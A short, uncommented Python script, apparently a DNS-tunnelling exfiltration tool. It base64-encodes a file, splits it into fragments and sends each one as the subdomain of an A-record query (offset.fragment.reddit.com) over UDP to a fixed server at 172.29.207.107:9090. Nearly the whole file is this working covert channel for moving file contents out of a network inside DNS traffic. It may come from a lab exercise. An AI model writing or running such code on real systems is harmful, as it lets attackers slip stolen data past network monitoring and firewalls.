from PIL import Image
import base64
from dns import build_message, send_udp_message

def read_image(image_path):
    try:
        with open(image_path, 'rb') as image_file:
            image_data = base64.b64encode(image_file.read()).decode('utf-8')
        print(image_data)
        return image_data
    except FileNotFoundError:
        print(f"Error: File '{image_path}' not found.")
        return None

def fragment_image(image_data, fragment_size):
    print(len(image_data))
    fragments = [image_data[i:i + fragment_size] for i in range(0, len(image_data), fragment_size)]
    return fragments

def generate_dns_queries(fragments, domain):
    queries = []
    offset=0
    for i, fragment in enumerate(fragments):
        query = f"{offset}.{fragment}.{domain}"
        queries.append(query)
        # Increment the offset
        offset += 1
    return queries


image_path = "circle.png"  # Replace with the path to your image file
fragment_size = 50  # Adjust fragment size based on your requirements
domain = "reddit.com"

image_data = read_image(image_path)

if image_data:
    fragments = fragment_image(image_data, fragment_size)
    dns_queries = generate_dns_queries(fragments, domain)

    print("Generated DNS Queries:")
    for query in dns_queries:
        print(query)
        message = build_message("A", query)
        response = send_udp_message(message, "172.29.207.107", 9090)

